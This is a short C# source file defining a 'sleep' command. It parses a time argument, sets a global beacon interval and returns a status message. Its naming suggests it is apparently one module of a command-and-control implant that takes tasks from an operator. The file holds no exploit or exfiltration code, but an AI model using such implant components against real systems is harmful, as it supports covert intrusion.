using System.Threading.Tasks;
using DynamicEngLoading;

using Engineer.Models;

namespace Engineer.Commands
{
    public class Sleep : EngineerCommand
    {
        public override string Name => "sleep";

        public override async Task Execute(EngineerTask task)
        {
            if (task.Arguments != null)
            {
                task.Arguments.TryGetValue("/time", out var sleep);

                EngCommBase.Sleep = int.Parse(sleep) * 1000;
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("Sleep set to " + EngCommBase.Sleep / 1000, task, EngTaskStatus.Complete,TaskResponseType.String);
            }
            else
                ForwardingFunctions.ForwardingFunctionWrap.FillTaskResults("error: " + "Sleep setting change failed, please provide a number in seconds like so Sleep 5", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
            
        }
    }
}
